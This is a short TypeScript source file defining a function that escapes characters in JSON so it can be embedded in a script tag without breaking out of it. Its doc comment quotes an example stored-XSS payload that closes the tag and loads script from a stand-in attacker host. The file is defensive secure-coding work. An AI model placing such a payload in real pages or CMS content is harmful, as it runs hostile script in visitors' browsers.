/**
 * JSON.stringify that is safe to embed inside a <script> tag.
 *
 * Plain JSON.stringify leaves "<", ">", "&" and line separators U+2028/U+2029
 * untouched, so a CMS value such as "</script><script src=//evil.example/x.js>"
 * would break out of the element and execute in the visitor's browser
 * (stored XSS). Escaping those characters keeps the output valid JSON while
 * making it impossible to close the containing <script> tag.
 */
export function toJsonLd(value: unknown): string {
  return (
    JSON.stringify(value)
      .replace(/</g, "\\u003c")
      .replace(/>/g, "\\u003e")
      .replace(/&/g, "\\u0026")
      .replace(/\u2028/g, "\\u2028")
      .replace(/\u2029/g, "\\u2029")
  );
}
